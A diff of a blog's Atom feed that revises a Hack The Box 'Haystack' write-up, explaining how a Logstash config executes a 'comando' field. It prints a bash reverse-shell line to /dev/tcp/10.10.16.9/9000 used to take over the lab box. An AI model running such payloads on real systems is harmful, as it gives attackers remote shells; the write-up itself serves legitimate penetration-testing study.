@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-28T16:37:15+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Haystack</title><link href="http://localhost:4000/2022/10/28/Haystack.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Haystack" /><published>2022-10-28T00:00:00+02:00</published><updated>2022-10-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/28/Haystack</id><content type="html" xml:base="http://localhost:4000/2022/10/28/Haystack.html"><![CDATA[<p><img src="/assets/Haystack/Haystack.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-28T16:44:56+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Haystack</title><link href="http://localhost:4000/2022/10/28/Haystack.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Haystack" /><published>2022-10-28T00:00:00+02:00</published><updated>2022-10-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/28/Haystack</id><content type="html" xml:base="http://localhost:4000/2022/10/28/Haystack.html"><![CDATA[<p><img src="/assets/Haystack/Haystack.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -236,7 +236,19 @@ org.logstash.Logstash <span class="se">\</span>
 
 <p><code class="language-plaintext highlighter-rouge">Ejecutar</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">commando</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">:</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code></p>
 
-<p><em>In order to own this box,</em> we would do something like <strong>place a reverse shell as the</strong> <code class="language-plaintext highlighter-rouge">commando</code> <strong>argument.</strong></p>
+<p>so that <strong>the “commando” argument would get executed</strong> as in <code class="language-plaintext highlighter-rouge">output.conf</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>output {
+    if [type] == "execute" {
+        stdout { codec =&gt; json }
+        exec {
+            command =&gt; "%{comando} &amp;"
+        }
+    }
+}
+</code></pre></div></div>
+
+<p><strong><em>to own this box,</em></strong> we would do something like <strong>place a reverse shell in the</strong> <code class="language-plaintext highlighter-rouge">commando</code> <strong>argument’s place</strong> like below:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
 </code></pre></div></div>
 
